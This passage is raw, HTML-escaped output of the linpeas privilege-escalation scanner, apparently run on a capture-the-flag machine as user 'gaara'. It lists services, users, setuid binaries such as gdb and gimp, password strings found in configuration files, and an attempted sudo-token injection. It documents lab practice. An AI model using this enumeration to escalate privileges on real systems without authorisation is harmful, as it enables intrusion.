https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf ( \u0026lt;policy group=\u0026#34;bluetooth\u0026#34;\u0026gt;\r\u0026lt;policy group=\u0026#34;lp\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf ( \u0026lt;policy group=\u0026#34;netdev\u0026#34;\u0026gt;)\r[+] D-Bus Service Objects list\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION\r:1.0 1 systemd root :1.0 init.scope - -\r:1.1 410 systemd-timesyn systemd-timesync :1.1 systemd-timesyncd.service - -\r:1.130 6301 busctl gaara :1.130 session-5.scope 5 -\r:1.3 427 wpa_supplicant root :1.3 wpa_supplicant.service - -\r:1.4 428 systemd-logind root :1.4 systemd-logind.service - -\r:1.62 1358 systemd gaara :1.62 user@1001.service - -\rfi.epitest.hostap.WPASupplicant 427 wpa_supplicant root :1.3 wpa_supplicant.service - -\rfi.w1.wpa_supplicant1 427 wpa_supplicant root :1.3 wpa_supplicant.service - -\rorg.bluez - - - (activatable) - -\rorg.freedesktop.DBus 1 systemd root - init.scope - -\rorg.freedesktop.hostname1 - - - (activatable) - -\rorg.freedesktop.locale1 - - - (activatable) - -\rorg.freedesktop.login1 428 systemd-logind root :1.4 systemd-logind.service - -\rorg.freedesktop.network1 - - - (activatable) - -\rorg.freedesktop.resolve1 - - - (activatable) - -\rorg.freedesktop.systemd1 1 systemd root :1.0 init.scope - -\rorg.freedesktop.timedate1 - - - (activatable) - -\rorg.freedesktop.timesync1 410 systemd-timesyn systemd-timesync :1.1 systemd-timesyncd.service - -\r═══════════════════════════════════╣ Network Information ╠════════════════════════════════════ [+] Hostname, hosts and DNS Gaara 127.0.0.1 localhost\r127.0.1.1 debian\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\rnameserver 192.168.213.254\rdnsdomainname Not Found\r[+] Content of /etc/inetd.conf \u0026amp; /etc/xinetd.conf\r/etc/inetd.conf Not Found [+] Interfaces\rdefault 0.0.0.0 loopback 127.0.0.0\rlink-local 169.254.0.0\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r3: ens192: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\rlink/ether 00:50:56:ba:2c:57 brd ff:ff:ff:ff:ff:ff\rinet 192.168.213.142/24 brd 192.168.213.255 scope global ens192\rvalid_lft forever preferred_lft forever\rinet6 fe80::250:56ff:feba:2c57/64 scope link valid_lft forever preferred_lft forever\r[+] Networks and neighbours\r192.168.213.254 dev ens192 lladdr 00:50:56:ba:07:c8 REACHABLE IP address HW type Flags HW address Mask Device\r192.168.213.254 0x1 0x2 00:50:56:ba:07:c8 * ens192\r[+] Iptables rules\riptables rules Not Found [+] Active Ports\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports [+] Can I sniff with tcpdump?\rNo ════════════════════════════════════╣ Users Information ╠════════════════════════════════════ [+] My user [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users uid=1001(gaara) gid=1001(gaara) groups=1001(gaara) [+] Do I have PGP keys?\rgpg Not Found netpgpkeys Not Found netpgp Not Found [+] Clipboard or highlighted text?\rxsel and xclip Not Found [+] Checking \u0026#39;sudo -l\u0026#39;, /etc/sudoers, and /etc/sudoers.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid [+] Checking sudo tokens\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens /proc/sys/kernel/yama/ptrace_scope is enabled (0) gdb was found in PATH\rChecking for sudo tokens in other shells owned by current user\rInjecting process 1368 -\u0026gt; bash\rThe escalation didn\u0026#39;t work... (try again later?)\r[+] Checking doas.conf\r/etc/doas.conf Not Found [+] Checking Pkexec policy\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2 [+] Superusers\rroot:x:0:0:root:/root:/bin/bash [+] Users with console\rgaara:x:1001:1001:,,,:/home/gaara:/bin/bash root:x:0:0:root:/root:/bin/bash\r[+] All users \u0026amp; groups\ruid=0(root) gid=0(root) groups=0(root) uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)\ruid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)\ruid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)\ruid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)\ruid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)\ruid=104(messagebus) gid=110(messagebus) groups=110(messagebus)\ruid=105(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)\ruid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)\ruid=10(uucp) gid=10(uucp) groups=10(uucp)\ruid=13(proxy) gid=13(proxy) groups=13(proxy)\ruid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=2(bin) gid=2(bin) groups=2(bin)\ruid=33(www-data) gid=33(www-data) groups=33(www-data)\ruid=34(backup) gid=34(backup) groups=34(backup)\ruid=38(list) gid=38(list) groups=38(list)\ruid=39(irc) gid=39(irc) groups=39(irc)\ruid=3(sys) gid=3(sys) groups=3(sys)\ruid=41(gnats) gid=41(gnats) groups=41(gnats)\ruid=4(sync) gid=65534(nogroup) groups=65534(nogroup)\ruid=5(games) gid=60(games) groups=60(games)\ruid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\ruid=6(man) gid=12(man) groups=12(man)\ruid=7(lp) gid=7(lp) groups=7(lp)\ruid=8(mail) gid=8(mail) groups=8(mail)\ruid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)\ruid=9(news) gid=9(news) groups=9(news)\r[+] Login now\r21:47:42 up 34 min, 1 user, load average: 1.11, 0.25, 0.08 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\rgaara pts/0 192.168.45.156 21:44 14.00s 0.02s 0.00s w\r[+] Last logons\rgaara pts/0 Wed May 17 21:44:33 2023 still logged in 192.168.45.156\rreboot system boot Fri Feb 17 12:19:35 2023 still running 0.0.0.0\rreboot system boot Thu Feb 16 03:00:23 2023 still running 0.0.0.0\rreboot system boot Wed Feb 15 14:46:11 2023 still running 0.0.0.0\rreboot system boot Sun Jan 29 11:58:36 2023 still running 0.0.0.0\rwtmp begins Sun Jan 29 11:58:36 2023\r[+] Last time logon each user\rUsername Port From Latest gaara pts/0 192.168.45.156 Wed May 17 21:44:33 -0400 2023\r[+] Password policy\rPASS_MAX_DAYS 99999 PASS_MIN_DAYS 0\rPASS_WARN_AGE 7\rENCRYPT_METHOD SHA512\r[+] Do not forget to test \u0026#39;su\u0026#39; as any other user with shell: without password and with their names as password (I can\u0026#39;t do it...) [+] Do not forget to execute \u0026#39;sudo -l\u0026#39; without password or with valid password (if you know it)!! ═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════ [+] MySQL version mysql Not Found [+] MySQL connection using default root/root ........... No\r[+] MySQL connection using root/toor ................... No [+] MySQL connection using root/NOPASS ................. No [+] Searching mysql credentials and exec [+] PostgreSQL version and pgadmin credentials\rNot Found [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No\r[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No [+] Apache server info\rVersion: Server version: Apache/2.4.38 (Debian) Server built: 2020-08-25T20:08:29\rPHP exec extensions\r[+] Searching PHPCookies\rNot Found [+] Searching Wordpress wp-config.php files\rwp-config.php Not Found [+] Searching Drupal settings.php files\r/default/settings.php Not Found [+] Searching Moodle config.php files\rconfig.php inside a moodle folder Not Found [+] Searching Tomcat users file\rtomcat-users.xml Not Found [+] Mongo information\rmongo binary Not Found [+] Searching supervisord configuration file\rsupervisord.conf Not Found [+] Searching cesi configuration file\rcesi.conf Not Found [+] Searching Rsyncd config file\rrsyncd.conf Not Found [+] Searching Hostapd config file hostapd.conf Not Found [+] Searching wifi conns file\rNot Found [+] Searching Anaconda-ks config files\ranaconda-ks.cfg Not Found [+] Searching .vnc directories and their passwd files\r.vnc Not Found [+] Searching ldap directories and their hashes\r/etc/ldap The password hash is from the {SSHA} to \u0026#39;structural\u0026#39;\r[+] Searching .ovpn files and credentials\r.ovpn Not Found [+] Searching ssl/ssh files\rChallengeResponseAuthentication no UsePAM yes\r--\u0026gt; /etc/hosts.allow file found, read the rules:\r/etc/hosts.allow\rSearching inside /etc/ssh/ssh_config for interesting info\rHost *\rSendEnv LANG LC_*\rHashKnownHosts yes\rGSSAPIAuthentication yes\r[+] Searching unexpected auth lines in /etc/pam.d/sshd\rNo [+] Searching Cloud credentials (AWS, Azure, GC)\r[+] NFS exports?\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe /etc/exports Not Found [+] Searching kerberos conf files and tickets\r[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt tickets kerberos Not Found klist Not Found [+] Searching Kibana yaml\rkibana.yml Not Found [+] Searching Knock configuration\rKnock.config Not Found [+] Searching logstash files\rNot Found [+] Searching elasticsearch files\rNot Found [+] Searching Vault-ssh files\rvault-ssh-helper.hcl Not Found [+] Searching AD cached hashes\rcached hashes Not Found [+] Searching screen sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions screen Not Found [+] Searching tmux sessions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions tmux Not Found [+] Searching Couchdb directory\r[+] Searching redis.conf\r[+] Searching dovecot files\rdovecot credentials Not Found [+] Searching mosquitto.conf\r[+] Searching neo4j auth file\r[+] Searching Cloud-Init conf file\r[+] Searching Erlang cookie file\r[+] Searching GVM auth file\r[+] Searching IPSEC files\r[+] Searching IRSSI files\r[+] Searching Keyring files\rKeyring folder: /usr/share/keyrings /usr/share/keyrings:\rtotal 132\r-rw-r--r-- 1 root root 8132 Apr 23 2019 debian-archive-buster-automatic.gpg\r-rw-r--r-- 1 root root 8141 Apr 23 2019 debian-archive-buster-security-automatic.gpg\r-rw-r--r-- 1 root root 2332 Apr 23 2019 debian-archive-buster-stable.gpg\r-rw-r--r-- 1 root root 5106 Apr 23 2019 debian-archive-jessie-automatic.gpg\r-rw-r--r-- 1 root root 5115 Apr 23 2019 debian-archive-jessie-security-automatic.gpg\r-rw-r--r-- 1 root root 2763 Apr 23 2019 debian-archive-jessie-stable.gpg\r-rw-r--r-- 1 root root 48747 Apr 23 2019 debian-archive-keyring.gpg\r-rw-r--r-- 1 root root 23889 Apr 23 2019 debian-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 7443 Apr 23 2019 debian-archive-stretch-automatic.gpg\r-rw-r--r-- 1 root root 7452 Apr 23 2019 debian-archive-stretch-security-automatic.gpg\r-rw-r--r-- 1 root root 2263 Apr 23 2019 debian-archive-stretch-stable.gpg\r[+] Searching Filezilla sites file\r[+] Searching backup-manager files\r[+] Searching uncommon passwd files (splunk)\r[+] Searching GitLab related files\r[+] Searching PGP/GPG\rPGP/GPG software: gpg Not Found\rnetpgpkeys Not Found netpgp Not Found [+] Searching vim files\r[+] Checking if containerd(ctr) is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation [+] Checking if runc is available\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation [+] Searching docker files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket [+] Interesting Firefox Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Interesting Chrome Files\r[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox [+] Autologin Files\r[+] S/Key authentication\r[+] YubiKey authentication\r[+] Passwords inside pam.d\r[+] FastCGI Params\r[+] SNMPs\r════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found strace Not Found -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 63K Jul 27 2018 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 83K Jul 27 2018 /usr/bin/gpasswd\r-rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/chsh\r-rwsr-xr-x 1 root root 53K Jul 27 2018 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-sr-x 1 root root 7.3M Dec 24 2018 /usr/bin/gimp-2.10\r-rwsr-xr-x 1 root root 35K Jan 10 2019 /usr/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 63K Jan 10 2019 /usr/bin/su\r-rwsr-xr-x 1 root root 51K Jan 10 2019 /usr/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-sr-x 1 root root 7.7M Oct 14 2019 /usr/bin/gdb\r-rwsr-xr-x 1 root root 427K Jan 31 2020 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 154K Feb 2 2020 /usr/bin/sudo\r-rwsr-xr-x 1 root root 35K Apr 22 2020 /usr/bin/fusermount\r-rwsr-xr-- 1 root messagebus 50K Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper [+] SGID\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwxr-sr-x 1 root mail 19K Dec 3 2017 /usr/bin/dotlockfile -rwxr-sr-x 1 root tty 15K May 4 2018 /usr/bin/bsd-write\r-rwxr-sr-x 1 root shadow 31K Jul 27 2018 /usr/bin/expiry\r-rwxr-sr-x 1 root shadow 71K Jul 27 2018 /usr/bin/chage\r-rwsr-sr-x 1 root root 7.3M Dec 24 2018 /usr/bin/gimp-2.10\r-rwxr-sr-x 1 root tty 35K Jan 10 2019 /usr/bin/wall\r-rwxr-sr-x 1 root shadow 39K Feb 14 2019 /usr/sbin/unix_chkpwd\r-rwxr-sr-x 1 root crontab 43K Oct 11 2019 /usr/bin/crontab\r-rwsr-sr-x 1 root root 7.7M Oct 14 2019 /usr/bin/gdb\r-rwxr-sr-x 1 root ssh 315K Jan 31 2020 /usr/bin/ssh-agent\r[+] Checking misconfigurations of ld.so\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so /etc/ld.so.conf include /etc/ld.so.conf.d/*.conf\r/etc/ld.so.conf.d\r/etc/ld.so.conf.d/libc.conf\r/usr/local/lib\r/etc/ld.so.conf.d/x86_64-linux-gnu.conf\r/usr/local/lib/x86_64-linux-gnu\r/lib/x86_64-linux-gnu\r/usr/lib/x86_64-linux-gnu\r[+] Capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities Current capabilities: Current: =\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rShell capabilities:\r0x0000000000000000=\rCapInh: 0000000000000000\rCapPrm: 0000000000000000\rCapEff: 0000000000000000\rCapBnd: 0000003fffffffff\rCapAmb: 0000000000000000\rFiles with capabilities:\r/usr/bin/ping = cap_net_raw+ep\r[+] Users with capabilities\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities /etc/security/capability.conf Not Found [+] Files with ACLs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls files with acls in searched folders Not Found [+] .sh files in path\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path /usr/bin/gettext.sh [+] Unexpected in root\r/vmlinuz.old /lost+found\r/lib32\r/vmlinuz\r/initrd.img\r/initrd.img.old\r/libx32\r[+] Files (scripts) in /etc/profile.d/\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files total 12 drwxr-xr-x 2 root root 4096 Dec 13 2020 .\rdrwxr-xr-x 85 root root 4096 Apr 27 2021 ..\r-rw-r--r-- 1 root root 664 Mar 1 2019 bash_completion.sh\r[+] Permissions in init, init.d, systemd, and rc.d\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d [+] Hashes inside passwd file? ........... No\r[+] Writable passwd file? ................ No [+] Credentials in fstab/mtab? ........... No [+] Can I read shadow files? ............. No [+] Can I read opasswd file? ............. No [+] Can I write in network-scripts? ...... No [+] Can I read root folder? .............. No [+] Searching root files in home dirs (limit 30)\r/home/ /home/gaara/.bash_history\r/root/\r[+] Searching folders owned by me containing others files on it\r[+] Readable files belonging to root and readable by me but not world readable\r[+] Modified interesting files in the last 5mins (limit 100)\r/var/log/lastlog /var/log/daemon.log\r/var/log/wtmp\r/var/log/auth.log\r/var/log/btmp\r/var/log/syslog\r[+] Writable log files (logrotten) (limit 100)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation logrotate 3.14.0 Default mail command: /usr/bin/mail\rDefault compress command: /bin/gzip\rDefault uncompress command: /bin/gunzip\rDefault compress extension: .gz\rDefault state file path: /var/lib/logrotate/status\rACL support: yes\rSELinux support: yes\r[+] Files inside /home/gaara (limit 20)\rtotal 360 drwxr-xr-x 2 gaara gaara 4096 May 17 21:47 .\rdrwxr-xr-x 3 root root 4096 Dec 13 2020 ..\rlrwxrwxrwx 1 root root 9 Mar 30 2021 .bash_history -\u0026gt; /dev/null\r-rw-r--r-- 1 gaara gaara 220 Dec 13 2020 .bash_logout\r-rw-r--r-- 1 gaara gaara 3526 Dec 13 2020 .bashrc\r-rw-r--r-- 1 gaara gaara 32 Apr 27 2021 flag.txt\r-rwxr-xr-x 1 gaara gaara 332111 May 5 04:06 linpeas.sh\r-rw-r--r-- 1 gaara gaara 33 May 17 21:16 local.txt\r-rw-r--r-- 1 gaara gaara 807 Dec 13 2020 .profile\r-rw------- 1 gaara gaara 102 Dec 13 2020 .Xauthority\r[+] Files inside others home (limit 20)\r[+] Searching installed mail applications\r[+] Mails (limit 50)\r[+] Backup folders\rdrwxr-xr-x 2 root root 4096 May 17 21:23 /var/backups total 1652\r-rw-r--r-- 1 root root 40960 Dec 13 2020 alternatives.tar.0\r-rw-r--r-- 1 root root 25581 Mar 30 2021 apt.extended_states.0\r-rw-r--r-- 1 root root 2730 Dec 13 2020 apt.extended_states.1.gz\r-rw-r--r-- 1 root root 186 Dec 13 2020 dpkg.diversions.0\r-rw-r--r-- 1 root root 126 Dec 13 2020 dpkg.diversions.1.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 dpkg.diversions.2.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 dpkg.diversions.3.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 dpkg.diversions.4.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 dpkg.diversions.5.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 dpkg.diversions.6.gz\r-rw-r--r-- 1 root root 135 Dec 13 2020 dpkg.statoverride.0\r-rw-r--r-- 1 root root 142 Dec 13 2020 dpkg.statoverride.1.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 dpkg.statoverride.2.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 dpkg.statoverride.3.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 dpkg.statoverride.4.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 dpkg.statoverride.5.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 dpkg.statoverride.6.gz\r-rw-r--r-- 1 root root 605642 Mar 30 2021 dpkg.status.0\r-rw-r--r-- 1 root root 166524 Mar 30 2021 dpkg.status.1.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 dpkg.status.2.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 dpkg.status.3.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 dpkg.status.4.gz\r-rw-r--r-- 1 root root 163457 Dec 13 2020 dpkg.status.5.gz\r-rw-r--r-- 1 root root 99155 Dec 13 2020 dpkg.status.6.gz\r-rw------- 1 root root 727 Dec 13 2020 group.bak\r-rw------- 1 root shadow 607 Dec 13 2020 gshadow.bak\r-rw------- 1 root root 1478 Dec 13 2020 passwd.bak\r-rw------- 1 root shadow 975 Apr 27 2021 shadow.bak\r[+] Backup files\r-rw-r--r-- 1 root root 9716 Nov 28 2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 43736 Oct 9 2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so\r-rw-r--r-- 1 root root 7867 Jul 16 1996 /usr/share/doc/telnet/README.old.gz\r-rw-r--r-- 1 root root 194817 Nov 23 2016 /usr/share/doc/x11-common/changelog.Debian.old.gz\r-rw-r--r-- 1 root root 303 Oct 26 2018 /usr/share/doc/hdparm/changelog.old.gz\r-rwxr-xr-x 1 root root 1513 Oct 19 2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl\r-rw-r--r-- 1 root root 363752 Apr 30 2018 /usr/share/doc/manpages/Changes.old.gz\r[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)\r[+] Web files?(output limit)\r/var/www/: total 12K\rdrwxr-xr-x 3 root root 4.0K Dec 13 2020 .\rdrwxr-xr-x 12 root root 4.0K Dec 13 2020 ..\rdrwxr-xr-x 2 root root 4.0K Mar 30 2021 html\r/var/www/html:\rtotal 192K\rdrwxr-xr-x 2 root root 4.0K Mar 30 2021 .\rdrwxr-xr-x 3 root root 4.0K Dec 13 2020 ..\r[+] Readable hidden interesting files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data [+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) -rw-r--r-- 1 root root 102 Oct 11 2019 /etc/cron.weekly/.placeholder -rw-r--r-- 1 root root 0 Dec 19 2018 /etc/sensors.d/.placeholder\r-rw------- 1 root root 0 Dec 13 2020 /etc/.pwd.lock\r-rw-r--r-- 1 root root 102 Oct 11 2019 /etc/cron.d/.placeholder\r-rw-r--r-- 1 root root 3526 Apr 18 2019 /etc/skel/.bashrc\r-rw-r--r-- 1 root root 807 Apr 18 2019 /etc/skel/.profile\r-rw-r--r-- 1 root root 220 Apr 18 2019 /etc/skel/.bash_logout\r-rw-r--r-- 1 root root 102 Oct 11 2019 /etc/cron.hourly/.placeholder\r-rw-r--r-- 1 root root 102 Oct 11 2019 /etc/cron.daily/.placeholder\r-rw-r--r-- 1 root root 102 Oct 11 2019 /etc/cron.monthly/.placeholder\r-rw-r--r-- 1 root root 0 Feb 17 12:19 /run/network/.ifstate.lock\r-rw-r--r-- 1 root staff 36 Dec 13 2020 /usr/local/share/fonts/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/cmap/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/truetype/droid/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/truetype/dejavu/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/truetype/noto/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/truetype/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/cMap/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/type1/gsfonts/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/type1/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/fonts/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/poppler/cMap/Adobe-GB1/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/poppler/cMap/Adobe-Japan1/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/poppler/cMap/Adobe-Japan2/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/poppler/cMap/Adobe-Korea1/.uuid\r-rw-r--r-- 1 root root 36 Dec 13 2020 /usr/share/poppler/cMap/Adobe-CNS1/.uuid\r-rw-r--r-- 1 root root 0 Nov 15 2018 /usr/share/dictionaries-common/site-elisp/.nosearch\r-rw-r--r-- 1 gaara gaara 3526 Dec 13 2020 /home/gaara/.bashrc\r-rw-r--r-- 1 gaara gaara 807 Dec 13 2020 /home/gaara/.profile\r-rw------- 1 gaara gaara 102 Dec 13 2020 /home/gaara/.Xauthority\r-rw-r--r-- 1 gaara gaara 220 Dec 13 2020 /home/gaara/.bash_logout\r[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) -rw-r--r-- 1 root root 126 Dec 13 2020 /var/backups/dpkg.diversions.1.gz -rw-r--r-- 1 root root 126 Dec 13 2020 /var/backups/dpkg.diversions.5.gz\r-rw-r--r-- 1 root root 99155 Dec 13 2020 /var/backups/dpkg.status.6.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 /var/backups/dpkg.diversions.3.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 /var/backups/dpkg.statoverride.6.gz\r-rw-r--r-- 1 root root 2730 Dec 13 2020 /var/backups/apt.extended_states.1.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 /var/backups/dpkg.statoverride.5.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 /var/backups/dpkg.status.3.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 /var/backups/dpkg.status.4.gz\r-rw-r--r-- 1 root root 126 Dec 13 2020 /var/backups/dpkg.diversions.2.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 /var/backups/dpkg.status.1.gz\r-rw-r--r-- 1 root root 40960 Dec 13 2020 /var/backups/alternatives.tar.0\r-rw-r--r-- 1 root root 135 Dec 13 2020 /var/backups/dpkg.statoverride.0\r-rw-r--r-- 1 root root 605642 Mar 30 2021 /var/backups/dpkg.status.0\r-rw-r--r-- 1 root root 126 Dec 13 2020 /var/backups/dpkg.diversions.4.gz\r-rw-r--r-- 1 root root 166524 Mar 30 2021 /var/backups/dpkg.status.2.gz\r-rw-r--r-- 1 root root 186 Dec 13 2020 /var/backups/dpkg.diversions.0\r-rw-r--r-- 1 root root 142 Dec 13 2020 /var/backups/dpkg.statoverride.1.gz\r-rw-r--r-- 1 root root 163457 Dec 13 2020 /var/backups/dpkg.status.5.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 /var/backups/dpkg.statoverride.3.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 /var/backups/dpkg.statoverride.4.gz\r-rw-r--r-- 1 root root 142 Dec 13 2020 /var/backups/dpkg.statoverride.2.gz\r-rw-r--r-- 1 root root 25581 Mar 30 2021 /var/backups/apt.extended_states.0\r-rw-r--r-- 1 root root 126 Dec 13 2020 /var/backups/dpkg.diversions.6.gz\r[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm\r/home/gaara\r/run/lock\r/run/user/1001\r/run/user/1001/systemd\r/tmp\r/tmp/.font-unix\r/tmp/.ICE-unix\r/tmp/.Test-unix\r/tmp/.X11-unix\r/tmp/.XIM-unix\r/usr/local/games\r/var/tmp\r[+] Interesting GROUP writable files (not in Home) (max 500)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group gaara: [+] Searching passwords in config PHP files\r[+] Checking for TTY (sudo/su) passwords in audit logs\r[+] Finding IPs inside logs (limit 70)\r1 /var/log/wtmp:192.168.45.156 1 /var/log/lastlog:192.168.45.156\r[+] Finding passwords inside logs (limit 70)\r[+] Finding emails inside logs (limit 70)\r[+] Finding *password* or *credential* files in home (limit 70)\r[+] Finding passwords inside key folders (limit 70) - only PHP files\r[+] Finding passwords inside key folders (limit 70) - no PHP files\r/etc/apache2/sites-available/default-ssl.conf: # file needs this password: `xxj31ZMTZzkVA\u0026#39;. /etc/debconf.conf:#BindPasswd: secret\r/etc/nsswitch.conf:passwd: files systemd\r/etc/pam.d/common-password:password [success=1 default=ignore] pam_unix.so obscure sha512\r/etc/security/namespace.init: gid=$(echo \u0026#34;$passwd\u0026#34; | cut -f4 -d\u0026#34;:\u0026#34;)\r/etc/security/namespace.init: homedir=$(echo \u0026#34;$passwd\u0026#34; | cut -f6 -d\u0026#34;:\u0026#34;)\r/etc/security/namespace.init: passwd=$(getent passwd \u0026#34;$user\u0026#34;)\r/etc/ssl/openssl.cnf:challengePassword = A challenge password\r/etc/ssl/openssl.cnf:challengePassword_max = 20\r/etc/ssl/openssl.cnf:challengePassword_min = 4\r/etc/ssl/openssl.cnf:# input_password = secret\r/etc/ssl/openssl.cnf:# output_password = secret\r/etc/vmware-tools/vm-support: sed 